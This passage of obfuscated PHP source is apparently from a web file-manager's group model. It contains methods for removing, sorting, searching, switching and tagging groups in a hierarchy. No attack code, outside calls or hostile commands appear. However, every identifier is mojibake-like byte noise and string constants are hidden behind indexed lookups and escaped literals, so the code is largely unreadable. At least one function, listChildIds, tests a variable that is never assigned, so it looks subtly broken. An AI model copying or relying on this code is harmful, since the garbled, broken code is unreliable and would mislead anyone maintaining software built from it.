$this->_clearCache($é¿¨Ù×); } return Model($äÊü´İÌ[1943])->addAll($×¨¤›ãï, array(), !0); } protected function groupRemove($¼Ö²ê›…, $Šµˆ»· = false) { $–Ôü•õ =& $_SERVER[ĞÂ¤àÓï]; $Õø×§¡„ = array($–Ôü•õ[1854] => $¼Ö²ê›…); $ƒşëà¡§ = $this->where($Õø×§¡„)->find(); if (!$ƒşëà¡§ || $ƒşëà¡§[$–Ôü•õ[432]] == 0) { return !1; } if (!$Šµˆ»·) { $Şœ¹›İÜ = $this->getInfoSimple($ƒşëà¡§[$–Ôü•õ[432]]); $this->_changeChildLevel($ƒşëà¡§, $Şœ¹›İÜ, !0); $this->where(array($–Ôü•õ[432] => $¼Ö²ê›…))->save(array($–Ôü•õ[432] => $ƒşëà¡§[$–Ôü•õ[432]])); } Model($–Ôü•õ[1943])->where($Õø×§¡„)->delete(); Model($–Ôü•õ[1944])->where($Õø×§¡„)->delete(); Model($–Ôü•õ[832])->groupRootRemove($¼Ö²ê›…); return $this->where($Õø×§¡„)->delete(); } protected function groupSort($æŸô³·Ù) { $×ˆâ¦ =& $_SERVER[ĞÂ¤àÓï]; $ı¢‰»É = array(); foreach ($æŸô³·Ù as $òÅÇËãÊ => $™Ş×‰£Š) { $ı¢‰»É[] = array($×ˆâ¦[1854], $™Ş×‰£Š, $×ˆâ¦[1878], $òÅÇËãÊ + 1); } $this->saveAll($ı¢‰»É); } public function listData() { $”ü¨êÔ÷ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($”ü¨êÔ÷[$_SERVER[ĞÂ¤àÓï][369]]); return $”ü¨êÔ÷; } private function _makeOrder($‚˜±³Ş· = '') { $Ÿ×¸Æèã =& $_SERVER[ĞÂ¤àÓï]; $µö»âÂá = array($Ÿ×¸Æèã[1854], $Ÿ×¸Æèã[32], $Ÿ×¸Æèã[1843], $Ÿ×¸Æèã[200]); $¶Öã½× = array($Ÿ×¸Æèã[450] => $Ÿ×¸Æèã[451], $Ÿ×¸Æèã[452] => $Ÿ×¸Æèã[453]); $¼—®³„€ = Input::get($Ÿ×¸Æèã[457], $Ÿ×¸Æèã[7], $Ÿ×¸Æèã[1858], $µö»âÂá); $Èâ„š¨¡ = Input::get($Ÿ×¸Æèã[458], $Ÿ×¸Æèã[7], $Ÿ×¸Æèã[1945], array($Ÿ×¸Æèã[1945], $Ÿ×¸Æèã[452])); $Èâ„š¨¡ = $¶Öã½×[$Èâ„š¨¡]; $‚˜±³Ş· = $‚˜±³Ş· . "{$¼—®³„€}\x20{$Èâ„š¨¡}\54\x20\x67\x72\x6f\x75\x70\111\x44\x20\141\x73\143"; return $this->order($‚˜±³Ş·); } public function listChild($¿ŒàŞİ) { $×¢ºÛ±ª =& $_SERVER[ĞÂ¤àÓï]; $ü¼Ñ®Ù² = $this->where(array($×¢ºÛ±ª[432] => $¿ŒàŞİ))->_makeOrder()->selectPage(200); $this->_listDataApply($ü¼Ñ®Ù²[$×¢ºÛ±ª[369]]); return $ü¼Ñ®Ù²; } public function listChildIds($Í¦©‹£œ) { $‚“„í¤ø =& $_SERVER[ĞÂ¤àÓï]; if (is_string($™ì¾Ëı€)) { $Í¦©‹£œ = explode($‚“„í¤ø[50], $Í¦©‹£œ); } $Á·¡°Û = $this->where(array($‚“„í¤ø[1854] => array($‚“„í¤ø[7], $Í¦©‹£œ)))->field($‚“„í¤ø[1946])->select(); if (!$Á·¡°Û) { return !1; } $´ÓËß“õ = array(); foreach ($Á·¡°Û as $²ß‚Ê£«) { $´ÓËß“õ[] = "\163\145\154\145\x63\164\x20\x67\x72\x6f\x75\x70\x49\104\40\146\162\x6f\x6d\x20\x60\147\162\157\x75\x70\x60\x20\x77\150\145\162\x65\40\160\x61\162\145\156\164\114\145\166\x65\154\x20\154\151\153\x65\40\47{$²ß‚Ê£«[$‚“„í¤ø[521]]}{$²ß‚Ê£«[$‚“„í¤ø[1854]]}\54\45\47"; } $´ÓËß“õ = implode($‚“„í¤ø[1947], $´ÓËß“õ); $Á·¡°Û = $this->query($´ÓËß“õ); if (!$Á·¡°Û) { return array(); } $Í¦©‹£œ = array_to_keyvalue($Á·¡°Û, $‚“„í¤ø[12], $‚“„í¤ø[1854]); return array_unique($Í¦©‹£œ); } public function listByID($—Ëü‡Âö) { $„îÇ¢ì­ =& $_SERVER[ĞÂ¤àÓï]; if (!$—Ëü‡Âö) { return array(); } $ß½¡º‰¼ = array($„îÇ¢ì­[1854] => array($„îÇ¢ì­[7], $—Ëü‡Âö)); $í…Ù¦¤„ = $this->where($ß½¡º‰¼)->select(); $í…Ù¦¤„ = array_sort_keep($í…Ù¦¤„, $„îÇ¢ì­[1854], $—Ëü‡Âö); $this->_listDataApply($í…Ù¦¤„); return $í…Ù¦¤„; } public function listSearch($†²ñİÍ») { $Õò°Öã =& $_SERVER[ĞÂ¤àÓï]; $²üÃ‚Ö = $†²ñİÍ»[$Õò°Öã[1948]]; $Ö²Ìûì = isset($†²ñİÍ»[$Õò°Öã[1949]]) ? $†²ñİÍ»[$Õò°Öã[1949]] : !1; if (!trim($²üÃ‚Ö)) { return !1; } $²üÃ‚Ö = str_replace($Õò°Öã[1950], $Õò°Öã[1951], $²üÃ‚Ö); $İ®á«Ê = array($Õò°Öã[1854] => array($Õò°Öã[383], "{$²üÃ‚Ö}\45"), $Õò°Öã[32] => array($Õò°Öã[383], "\x25{$²üÃ‚Ö}\45"), $Õò°Öã[1000] => $Õò°Öã[1952]); if ($Ö²Ìûì) { $ şªš¸ = $this->getInfoSimple($Ö²Ìûì); $ò¶õ¨ü = $ şªš¸[$Õò°Öã[521]] . $Ö²Ìûì . $Õò°Öã[551]; $İ®á«Ê = array($İ®á«Ê, array($Õò°Öã[521] => array($Õò°Öã[383], $ò¶õ¨ü))); } $İ®á«Ê = $this->parseWhereLike($İ®á«Ê); $‘şÌ»ˆ¿ = $this->_makeOrder()->where($İ®á«Ê)->selectPage(20); $‘şÌ»ˆ¿ = $‘şÌ»ˆ¿ ? $‘şÌ»ˆ¿ : array($Õò°Öã[369] => array(), $Õò°Öã[366] => array()); if (!$‘şÌ»ˆ¿ || count($‘şÌ»ˆ¿[$Õò°Öã[369]]) < 5 && Input::check($²üÃ‚Ö, $Õò°Öã[318])) { $§áŒš» = $this->groupChildrenAll($Ö²Ìûì); $í¤ûîõ = $this->_searchFromMeta($Õò°Öã[464], $²üÃ‚Ö, 10, $§áŒš»); $ğğœã‘à = $this->_searchFromMeta($Õò°Öã[465], $²üÃ‚Ö, 10, $§áŒš»); $®‹ø ÏÕ = array_merge($í¤ûîõ, $ğğœã‘à, $‘şÌ»ˆ¿[$Õò°Öã[369]]); $‘şÌ»ˆ¿[$Õò°Öã[369]] = array_unique_by_key($®‹ø ÏÕ, $Õò°Öã[1854]); $‘şÌ»ˆ¿[$Õò°Öã[366]][$Õò°Öã[367]] = count($‘şÌ»ˆ¿[$Õò°Öã[369]]); $‘şÌ»ˆ¿[$Õò°Öã[366]][$Õò°Öã[368]] = ceil($‘şÌ»ˆ¿[$Õò°Öã[366]][$Õò°Öã[367]] / $‘şÌ»ˆ¿[$Õò°Öã[366]][$Õò°Öã[363]]); } $this->_listDataApply($‘şÌ»ˆ¿[$Õò°Öã[369]]); return $‘şÌ»ˆ¿; } protected function groupChildrenAll($™íºç­®) { $‹Ã¦ÖˆŞ =& $_SERVER[ĞÂ¤àÓï]; if (!$™íºç­®) { return !1; } if (is_string($™íºç­®)) { $™íºç­® = array($™íºç­®); } $½Åê´Ü = $™íºç­®; foreach ($™íºç­® as $Ñ½¹³à) { $†’¤‚Ê = $this->getInfoSimple($Ñ½¹³à); $Íç±ºŸ = array($‹Ã¦ÖˆŞ[521] => array($‹Ã¦ÖˆŞ[383], $†’¤‚Ê[$‹Ã¦ÖˆŞ[521]] . $Ñ½¹³à . $‹Ã¦ÖˆŞ[551])); $ÓÓ¿ïÎ‡ = $this->field($‹Ã¦ÖˆŞ[1854])->where($Íç±ºŸ)->select(); $½Åê´Ü = array_merge($½Åê´Ü, array_to_keyvalue($ÓÓ¿ïÎ‡, $‹Ã¦ÖˆŞ[12], $‹Ã¦ÖˆŞ[1854])); } return array_unique($½Åê´Ü); } private function _searchFromMeta($®¨óë¬¸, $¾ÕÅíª‰, $Å±ªÓó°, $¸Õ´Ñ‚…) { $¯È³ğó =& $_SERVER[ĞÂ¤àÓï]; $¾ÕÅíª‰ = strtolower($¾ÕÅíª‰); $Ø¸ªé˜– = array($¯È³ğó[94] => $®¨óë¬¸, $¯È³ğó[374] => array($¯È³ğó[383], "\x25{$¾ÕÅíª‰}\x25")); $Ø¸ªé˜– = $this->parseWhereLike($Ø¸ªé˜–); if ($¸Õ´Ñ‚…) { $Ø¸ªé˜–[$¯È³ğó[1854]] = array($¯È³ğó[7], $¸Õ´Ñ‚…); } $ïÈ²Ôà = Model($¯È³ğó[1953])->where($Ø¸ªé˜–)->limit($Å±ªÓó°)->select(); if (!$ïÈ²Ôà) { return array(); } $ïÈ²Ôà = array_to_keyvalue($ïÈ²Ôà, $¯È³ğó[12], $¯È³ğó[1854]); $¸ê™¢èĞ = $this->where(array($¯È³ğó[1942] => array($¯È³ğó[7], $ïÈ²Ôà)))->select(); if (!$¸ê™¢èĞ) { return array(); } return $¸ê™¢èĞ; } protected function _listDataApplyItem($¶±Õ¹ü) { $Œ­Î¨È÷ = array($¶±Õ¹ü); $this->_listDataApply($Œ­Î¨È÷); return $Œ­Î¨È÷[0]; } protected function _listDataApply(&$ğ•¡–ïƒ) { $â‰Óá­¬ =& $_SERVER[ĞÂ¤àÓï]; if (!$ğ•¡–ïƒ) { return; } $ÖâÁ¤ô = array_to_keyvalue($ğ•¡–ïƒ, $â‰Óá­¬[12], $â‰Óá­¬[1854]); $this->_listAppendChildren($ğ•¡–ïƒ); $this->_listAppendChildrenMember($ğ•¡–ïƒ); $this->_listAppendMeta($ğ•¡–ïƒ, $ÖâÁ¤ô); $this->_listAppendParent($ğ•¡–ïƒ); $this->_listAppendSourceRoot($ğ•¡–ïƒ, $ÖâÁ¤ô); } private function _listAppendChildren(&$ƒÛ”ˆÎ) { $Øş³ =& $_SERVER[ĞÂ¤àÓï]; $Ü¼ô¾·ğ = array_to_keyvalue($ƒÛ”ˆÎ, $Øş³[12], $Øş³[1854]); $İâŸ¶„Ï = array($Øş³[432] => array($Øş³[7], $Ü¼ô¾·ğ)); $œ‚š¬– = array($Øş³[432], $Øş³[1954] => $Øş³[500]); $æ¡ó§¤¦ = $this->field($œ‚š¬–)->where($İâŸ¶„Ï)->group($Øş³[432])->select(); $ùÑÔ÷êè = array_to_keyvalue($æ¡ó§¤¦, $Øş³[432], $Øş³[500]); foreach ($ƒÛ”ˆÎ as &$â¥®ÛÙ™) { $Ò‡¸Â¯Ï = $â¥®ÛÙ™[$Øş³[1854]]; $â¥®ÛÙ™[$Øş³[1955]] = isset($ùÑÔ÷êè[$Ò‡¸Â¯Ï]) ? intval($ùÑÔ÷êè[$Ò‡¸Â¯Ï]) : !1; } unset($â¥®ÛÙ™); } private function _listAppendChildrenMember(&$¡Š¦Üš¢) { $Ğ«ß“¡ =& $_SERVER[ĞÂ¤àÓï]; $Š­ÈËß = array_to_keyvalue($¡Š¦Üš¢, $Ğ«ß“¡[12], $Ğ«ß“¡[1854]); $¶–ÂƒÛ = array($Ğ«ß“¡[1854] => array($Ğ«ß“¡[7], $Š­ÈËß)); $¤æÍ‰¸€ = array($Ğ«ß“¡[1854], $Ğ«ß“¡[1954] => $Ğ«ß“¡[500]); $ÏšÂ­íï = Model($Ğ«ß“¡[1944])->field($¤æÍ‰¸€)->where($¶–ÂƒÛ)->group($Ğ«ß“¡[1854])->select(); $Ö¡Øî€´ = array_to_keyvalue($ÏšÂ­íï, $Ğ«ß“¡[1854], $Ğ«ß“¡[500]); foreach ($¡Š¦Üš¢ as &$«Ê™Ğ™Ê) { $ıô€Ëµ = $«Ê™Ğ™Ê[$Ğ«ß“¡[1854]]; $«Ê™Ğ™Ê[$Ğ«ß“¡[1956]] = isset($Ö¡Øî€´[$ıô€Ëµ]) ? intval($Ö¡Øî€´[$ıô€Ëµ]) : !1; } unset($«Ê™Ğ™Ê); } private function _listAppendMeta(&$â²ğß‡°, $ıéñ¾õ) { $Ä–Ä¤ =& $_SERVER[ĞÂ¤àÓï]; $Ò¡ï¤İê = array($Ä–Ä¤[1854] => array($Ä–Ä¤[7], $ıéñ¾õ)); $ˆãÚæ¥ü = Model($Ä–Ä¤[1943])->where($Ò¡ï¤İê)->select(); $ˆãÚæ¥ü = array_to_keyvalue_group($ˆãÚæ¥ü, $Ä–Ä¤[1854]); foreach ($ˆãÚæ¥ü as &$ˆ·¹Å™ ) { $ˆ·¹Å™  = array_to_keyvalue($ˆ·¹Å™ , $Ä–Ä¤[94], $Ä–Ä¤[374]); } unset($ˆ·¹Å™ ); foreach ($â²ğß‡° as &$¨ÇŒëÑË) { $¨ÇŒëÑË[$Ä–Ä¤[466]] = array(); if (isset($ˆãÚæ¥ü[$¨ÇŒëÑË[$Ä–Ä¤[1854]]])) { $¨ÇŒëÑË[$Ä–Ä¤[466]] = $ˆãÚæ¥ü[$¨ÇŒëÑË[$Ä–Ä¤[1854]]]; } } unset($¨ÇŒëÑË); } protected function parentLevelArray($­Ä”Ï„) { $˜çÊıìÀ =& $_SERVER[ĞÂ¤àÓï]; $­Ä”Ï„ = explode($˜çÊıìÀ[50], trim($­Ä”Ï„, $˜çÊıìÀ[50])); $­Ä”Ï„ = array_remove_value($­Ä”Ï„, $˜çÊıìÀ[197]); return $­Ä”Ï„; } protected function parentInGroup($·ö¯„Ğœ, $‘ì—¸©Õ) { $î…¦Š›Õ =& $_SERVER[ĞÂ¤àÓï]; $Ê€›ëÜ = $this->getInfoSimple($·ö¯„Ğœ); if (!$Ê€›ëÜ) { return !0; } $…İ”ª¿‹ = $this->parentLevelArray($Ê€›ëÜ[$î…¦Š›Õ[521]]); $…İ”ª¿‹[] = $·ö¯„Ğœ; foreach ($…İ”ª¿‹ as $·ö¯„Ğœ) { if (in_array($·ö¯„Ğœ . $î…¦Š›Õ[12], $‘ì—¸©Õ)) { return !0; } } return !1; } private function _listAppendParent(&$×‰Ø½ÀĞ) { $ëö‹Í¤Ş =& $_SERVER[ĞÂ¤àÓï]; $†‚ø¸¬‰ = array(); foreach ($×‰Ø½ÀĞ as &$³È±×¥¸) { $†‚ø¸¬‰[$³È±×¥¸[$ëö‹Í¤Ş[1854]]] = $³È±×¥¸[$ëö‹Í¤Ş[32]]; $ƒÜâÂµ = $this->parentLevelArray($³È±×¥¸[$ëö‹Í¤Ş[521]]); foreach ($ƒÜâÂµ as $œÊ ‹£) { if (!isset($†‚ø¸¬‰[$œÊ ‹£])) { $†‚ø¸¬‰[$œÊ ‹£] = 0; } } } unset($³È±×¥¸); foreach ($†‚ø¸¬‰ as $ìÙ§ç»é => $â›÷Øü‚) { if ($â›÷Øü‚) { continue; } $ıÌ¡“‡ = $this->getInfoSimple($ìÙ§ç»é); $†‚ø¸¬‰[$ìÙ§ç»é] = $ıÌ¡“‡[$ëö‹Í¤Ş[32]]; } $¢²¡ÌÁ = $GLOBALS[$ëö‹Í¤Ş[6]][$ëö‹Í¤Ş[89]][$ëö‹Í¤Ş[1957]]; if ($GLOBALS[$ëö‹Í¤Ş[503]] == $ëö‹Í¤Ş[88]) { $¢²¡ÌÁ = !1; } foreach ($×‰Ø½ÀĞ as &$³È±×¥¸) { $ƒÜâÂµ = $this->parentLevelArray($³È±×¥¸[$ëö‹Í¤Ş[521]]); $’‡÷ÖÑ— = $ëö‹Í¤Ş[12]; foreach ($ƒÜâÂµ as $ìÙ§ç»é => $œÊ ‹£) { if ($¢²¡ÌÁ && $ìÙ§ç»é == 0) { continue; } $’‡÷ÖÑ— .= $†‚ø¸¬‰[$œÊ ‹£] . $ëö‹Í¤Ş[8]; } if ($ƒÜâÂµ) { $’‡÷ÖÑ— .= $³È±×¥¸[$ëö‹Í¤Ş[32]]; } $³È±×¥¸[$ëö‹Í¤Ş[526]] = str_replace($ëö‹Í¤Ş[529], $ëö‹Í¤Ş[8], $’‡÷ÖÑ—); } unset($³È±×¥¸); } private function _listAppendSourceRoot(&$¡Åü£–À, $“İÜØÆó) { $™¥ÁÖì¹ =& $_SERVER[ĞÂ¤àÓï]; $Ç‰¥ü„í = Model($™¥ÁÖì¹[832])->listSourceRoot(SourceModel::TYPE_GROUP, $“İÜØÆó); $Ç‰¥ü„í = array_to_keyvalue($Ç‰¥ü„í, $™¥ÁÖì¹[505]); $Ç‰¥ü„í = array_remove_key($Ç‰¥ü„í, $™¥ÁÖì¹[505]); foreach ($¡Åü£–À as &$Úµóâ×—) { $Úµóâ×—[$™¥ÁÖì¹[86]] = $Ç‰¥ü„í[$Úµóâ×—[$™¥ÁÖì¹[1854]]] ? $Ç‰¥ü„í[$Úµóâ×—[$™¥ÁÖì¹[1854]]] : array(); } unset($Úµóâ×—); } protected function groupMerge($ûëıáô) { $ûëıáô = array_values(array_unique($ûëıáô)); $é‡¡›ì = array(); for ($­¹ÙÀ‹¹ = 0; $­¹ÙÀ‹¹ < count($ûëıáô); $­¹ÙÀ‹¹++) { $ÆŒë´–å = !1; for ($«ª€·€‚ = 0; $«ª€·€‚ < count($ûëıáô); $«ª€·€‚++) { if ($­¹ÙÀ‹¹ == $«ª€·€‚) { continue; } if ($this->isParentOf($ûëıáô[$«ª€·€‚], $ûëıáô[$­¹ÙÀ‹¹])) { $ÆŒë´–å = !0; break; } } if (!$ÆŒë´–å) { $é‡¡›ì[] = $ûëıáô[$­¹ÙÀ‹¹]; } } return $é‡¡›ì; } protected function isParentOf($ïİøê²½, $ÚÓŠœè˜) { $‡ÙûÁ£ =& $_SERVER[ĞÂ¤àÓï]; if (!$ïİøê²½ || !$ÚÓŠœè˜ || $ïİøê²½ == $ÚÓŠœè˜) { return !1; } $Ÿ·–›Ø¥ = $this->getInfoSimple($ïİøê²½); $ˆƒİ¶ = $this->getInfoSimple($ÚÓŠœè˜); $¡·çıæ» = $Ÿ·–›Ø¥[$‡ÙûÁ£[521]] . $ïİøê²½ . $‡ÙûÁ£[50]; if (substr($ˆƒİ¶[$‡ÙûÁ£[521]], 0, strlen($¡·çıæ»)) == $¡·çıæ») { return !0; } return !1; } public function groupShowRoot($ÊˆŞä„, $ØÚÀì«ù = false) { $çÃñ°ÎÏ =& $_SERVER[ĞÂ¤àÓï]; $ËÉ®¼™» = $this->getInfo($ÊˆŞä„); if (!$ËÉ®¼™») { return array(); } $€ğ£ÄÅ = $this->parentLevelArray($ËÉ®¼™»[$çÃñ°ÎÏ[521]]); $şíù°÷æ = array($ÊˆŞä„); if (count($€ğ£ÄÅ) == 0) { return $şíù°÷æ; } if ($ØÚÀì«ù && count($€ğ£ÄÅ) == 1) { return $şíù°÷æ; } if (!$ËÉ®¼™»[$çÃñ°ÎÏ[466]] || !isset($ËÉ®¼™»[$çÃñ°ÎÏ[466]][$çÃñ°ÎÏ[1940]]) || $ËÉ®¼™»[$çÃñ°ÎÏ[466]][$çÃñ°ÎÏ[1940]] == $çÃñ°ÎÏ[1909]) { return $this->groupShowRoot($€ğ£ÄÅ[count($€ğ£ÄÅ) - 1], $ØÚÀì«ù); } if ($ËÉ®¼™»[$çÃñ°ÎÏ[466]][$çÃñ°ÎÏ[1940]] == $çÃñ°ÎÏ[357]) { $¡×Á¢ô = explode($çÃñ°ÎÏ[50], $ËÉ®¼™»[$çÃñ°ÎÏ[466]][$çÃñ°ÎÏ[1941]]); if ($¡×Á¢ô) { $şíù°÷æ = array_merge($şíù°÷æ, $¡×Á¢ô); } } return $şíù°÷æ; } protected function resetParentLevel() { $Óû‘˜À =& $_SERVER[ĞÂ¤àÓï]; $æ‹­Éİ = $Óû‘˜À[1854]; $¤¯ÚûÒ˜ = $this->select(); $¤¯ÚûÒ˜ = array_to_keyvalue($¤¯ÚûÒ˜, $æ‹­Éİ); foreach ($¤¯ÚûÒ˜ as $ó¹ÊçĞş) { $òÔ×Õ¡ç = $ó¹ÊçĞş; $ÄÕœşÎŒ = array(); while ($òÔ×Õ¡ç[$Óû‘˜À[432]] != 0) { $ÄÕœşÎŒ[] = $òÔ×Õ¡ç[$Óû‘˜À[432]]; $òÔ×Õ¡ç = $¤¯ÚûÒ˜[$òÔ×Õ¡ç[$Óû‘˜À[432]]]; } $ÄÕœşÎŒ[] = 0; $ÄÕœşÎŒ = $Óû‘˜À[50] . implode($Óû‘˜À[50], array_reverse($ÄÕœşÎŒ)) . $Óû‘˜À[50]; $this->setNamePinyin($ó¹ÊçĞş[$æ‹­Éİ], $ó¹ÊçĞş[$Óû‘˜À[32]]); $this->where(array($æ‹­Éİ => $ó¹ÊçĞş[$æ‹­Éİ]))->save(array($Óû‘˜À[590] => $ÄÕœşÎŒ)); } return $¤¯ÚûÒ˜; } public function groupNameAuto($½ƒ½¹“², $Áº²èĞş) { $Àô×µ²Ë =& $_SERVER[ĞÂ¤àÓï]; $ß…î²òã = $this->where(array($Àô×µ²Ë[401] => $½ƒ½¹“²))->getField($Àô×µ²Ë[32], !0); if (!$ß…î²òã || !in_array($Áº²èĞş, $ß…î²òã)) { return $Áº²èĞş; } for ($— ³’ = 1; $— ³’ <= count($ß…î²òã) + 1; $— ³’++) { $Û€õ¾Õ§ = $Áº²èĞş . "\x28{$— ³’}\x29"; if (!in_array($Û€õ¾Õ§, $ß…î²òã)) { return $Û€õ¾Õ§; } } } public function groupSwitch($ÕäÍÁ€´, $’ì·ê¦æ) { $àßôÕ»‘ =& $_SERVER[ĞÂ¤àÓï]; $èåÊÔª¾ = array($àßôÕ»‘[1854] => array($àßôÕ»‘[7], array($ÕäÍÁ€´, $’ì·ê¦æ))); $ÒÉ õÖ = $this->where($èåÊÔª¾)->select(); $ÒÉ õÖ = array_to_keyvalue($ÒÉ õÖ, $àßôÕ»‘[1854]); if (!isset($ÒÉ õÖ[$ÕäÍÁ€´]) || !isset($ÒÉ õÖ[$’ì·ê¦æ]) || $ÒÉ õÖ[$ÕäÍÁ€´][$àßôÕ»‘[432]] == 0) { return !1; } $èåÊÔª¾ = array($àßôÕ»‘[1854] => $ÕäÍÁ€´); $“¸ûÊÌÕ = Model($àßôÕ»‘[1944])->where($èåÊÔª¾)->select(); if (!$“¸ûÊÌÕ) { $“¸ûÊÌÕ = array(); } foreach ($“¸ûÊÌÕ as $Ä“îĞ´) { $å±ÂáıÈ = $Ä“îĞ´[$àßôÕ»‘[1664]]; $èåÊÔª¾ = array($àßôÕ»‘[1664] => $å±ÂáıÈ, $àßôÕ»‘[1854] => $’ì·ê¦æ); $ì·¬ ­ò = Model($àßôÕ»‘[1944])->where($èåÊÔª¾)->find(); if (!$ì·¬ ­ò) { $–ÛáÎ±Å = array($’ì·ê¦æ => $Ä“îĞ´[$àßôÕ»‘[1958]]); Model($àßôÕ»‘[535])->userGroupAdd($å±ÂáıÈ, $–ÛáÎ±Å); } Model($àßôÕ»‘[535])->userGroupRemove($å±ÂáıÈ, $ÕäÍÁ€´); } $èåÊÔª¾ = array($àßôÕ»‘[411] => 2, $àßôÕ»‘[432] => 0, $àßôÕ»‘[410] => 1, $àßôÕ»‘[505] => array($àßôÕ»‘[7], array($ÕäÍÁ€´, $’ì·ê¦æ))); $¢ê«™µ  = Model($àßôÕ»‘[832])->where($èåÊÔª¾)->field($àßôÕ»‘[1959])->select(); $¢ê«™µ  = array_to_keyvalue($¢ê«™µ , $àßôÕ»‘[505], $àßôÕ»‘[402]); $è“˜ï˜… = !empty($¢ê«™µ [$ÕäÍÁ€´]) ? $¢ê«™µ [$ÕäÍÁ€´] : !1; if ($è“˜ï˜…) { if (!$¢ê«™µ [$’ì·ê¦æ]) { $¢ê«™µ [$’ì·ê¦æ] = Model($àßôÕ»‘[832])->groupRootAdd($’ì·ê¦æ); } $éÕ­Èñ« = $¢ê«™µ [$’ì·ê¦æ]; $èåÊÔª¾ = array($àßôÕ»‘[432] => $è“˜ï˜…); $¢ê«™µ  = Model($àßôÕ»‘[832])->where($èåÊÔª¾)->field($àßôÕ»‘[1960])->select(); if (!$¢ê«™µ ) { $¢ê«™µ  = array(); } Model($àßôÕ»‘[832])->moveClearAuth = !1; foreach ($¢ê«™µ  as $ˆ¹ìšĞ‚) { $ôÔç€ = $ˆ¹ìšĞ‚[$àßôÕ»‘[410]] == $àßôÕ»‘[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($àßôÕ»‘[832])->move($ˆ¹ìšĞ‚[$àßôÕ»‘[402]], $éÕ­Èñ«, $ôÔç€); } Model($àßôÕ»‘[832])->moveClearAuth = !0; $èåÊÔª¾ = array($àßôÕ»‘[411] => 2, $àßôÕ»‘[505] => $ÕäÍÁ€´); $’éïµ½— = array($àßôÕ»‘[505] => $’ì·ê¦æ); Model($àßôÕ»‘[1961])->where($èåÊÔª¾)->save($’éïµ½—); Model($àßôÕ»‘[1962])->where($èåÊÔª¾)->save($’éïµ½—); } $this->_changeChildLevel($ÒÉ õÖ[$ÕäÍÁ€´], $ÒÉ õÖ[$’ì·ê¦æ], !0); $this->where(array($àßôÕ»‘[432] => $ÕäÍÁ€´))->save(array($àßôÕ»‘[432] => $’ì·ê¦æ)); $this->_clearChildrenCache($ÒÉ õÖ[$’ì·ê¦æ]); return !0; } } goto a„ÜäÍ›; a„ÜäÍ›: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\146\x61\166"; protected function cacheFunctionAlias($›éÛÛšê) { $»Û¢Ó€Å =& $_SERVER[ĞÂ¤àÓï]; return array($»Û¢Ó€Å[1963] => array($›éÛÛšê[0], $»Û¢Ó€Å[1964]), $»Û¢Ó€Å[1965] => array($›éÛÛšê[0], $»Û¢Ó€Å[1966])); } protected function get($§ö™Ø•¾) { $Ì€ïş—­ =& $_SERVER[ĞÂ¤àÓï]; $¢¨÷öç² = Model($Ì€ïş—­[522])->metaGet($§ö™Ø•¾, $Ì€ïş—­[1967]); $µéå¬ìÒ = json_decode($¢¨÷öç², !0); return $µéå¬ìÒ ? $µéå¬ìÒ : array($Ì€ïş—­[1968] => $Ì€ïş—­[88], $Ì€ïş—­[369] => array()); } protected function set($óÀ»¼›æ, $ïÎ¿’ïË) { $÷Éóê‡ß =& $_SERVER[ĞÂ¤àÓï]; $ïÎ¿’ïË = $ïÎ¿’ïË ? $ïÎ¿’ïË : array($÷Éóê‡ß[1968] => $÷Éóê‡ß[88], $÷Éóê‡ß[369] => array()); return Model($÷Éóê‡ß[522])->metaSet($óÀ»¼›æ, $÷Éóê‡ß[1967], json_encode($ïÎ¿’ïË)); } protected function getByTagID($ô™œ™ô, $’ı•ØÍş) { $œ”“ãÕĞ =& $_SERVER[ĞÂ¤àÓï]; if (!$ô™œ™ô || !$’ı•ØÍş) { return !1; } if (!Model($œ”“ãÕĞ[522])->getInfoSimple($ô™œ™ô)) { return !1; } $©÷˜§ßü = $this->get($ô™œ™ô); if (!$©÷˜§ßü || !isset($©÷˜§ßü[$œ”“ãÕĞ[369]])) { return !1; } $İÅØïé = array_find_by_field($©÷˜§ßü[$œ”“ãÕĞ[369]], $œ”“ãÕĞ[399], $’ı•ØÍş); return is_array($İÅØïé) ? $İÅØïé : !1; } public function listSource($İÓÉÀÌó, $ÛêÑœ³) { $´Û§¢ÁŞ =& $_SERVER[ĞÂ¤àÓï]; if ($ÛêÑœ³ && !is_array($ÛêÑœ³)) { $ÛêÑœ³ = array($ÛêÑœ³); } $£û„ò…  = $this->listData($İÓÉÀÌó); $°ë¹Ù“’ = array(); foreach ($£û„ò…  as $óâ÷ş°Ô) { $Û¢¬¥ÖÌ = $óâ÷ş°Ô[$´Û§¢ÁŞ[84]]; if (!$Û¢¬¥ÖÌ) { continue; } if (!isset($°ë¹Ù“’[$Û¢¬¥ÖÌ])) { $°ë¹Ù“’[$Û¢¬¥ÖÌ] = array(); } $°ë¹Ù“’[$Û¢¬¥ÖÌ][] = $óâ÷ş°Ô[$´Û§¢ÁŞ[426]]; } $Òë¸â¯  = array(); foreach ($°ë¹Ù“’ as $°–Æî« => $ªé„ùÍ·) { $±‡ÂÜÍ¤ = !0; if (!$ÛêÑœ³) { $Òë¸â¯ [] = $°–Æî«; continue; } foreach ($ÛêÑœ³ as $«çœ“’Å) { if (!in_array($«çœ“’Å, $ªé„ùÍ·)) { $±‡ÂÜÍ¤ = !1; break; } } if ($±‡ÂÜÍ¤) { $Òë¸â¯ [] = $°–Æî«; } } if (!$Òë¸â¯ ) { return array(); } $ñóàª©Ş = array($´Û§¢ÁŞ[417] => array($´Û§¢ÁŞ[418], $Òë¸â¯ ), $´Û§¢ÁŞ[505] => $İÓÉÀÌó, $´Û§¢ÁŞ[411] => SourceModel::TYPE_GROUP); $·Æˆ¦Œš = Model($´Û§¢ÁŞ[1336])->listSource($ñóàª©Ş); if (!$·Æˆ¦Œš || count($Òë¸â¯ ) == $·Æˆ¦Œš[$´Û§¢ÁŞ[366]][$´Û§¢ÁŞ[367]]) { return $·Æˆ¦Œš; } $ğÔÏš© = array(); $Ä»ŸŒÂ… = array_to_keyvalue($·Æˆ¦Œš[$´Û§¢ÁŞ[82]], $´Û§¢ÁŞ[12], $´Û§¢ÁŞ[402]); $»Ô–¥Öş = array_to_keyvalue($·Æˆ¦Œš[$´Û§¢ÁŞ[83]], $´Û§¢ÁŞ[12], $´Û§¢ÁŞ[402]); $¦ßı­ğé = array_merge($»Ô–¥Öş, $Ä»ŸŒÂ…); foreach ($Òë¸â¯  as $Û¢¬¥ÖÌ) { if (!in_array($Û¢¬¥ÖÌ, $¦ßı­ğé)) { $ğÔÏš©[] = $Û¢¬¥ÖÌ; } } if ($ğÔÏš©) { $this->removeBySource($İÓÉÀÌó, 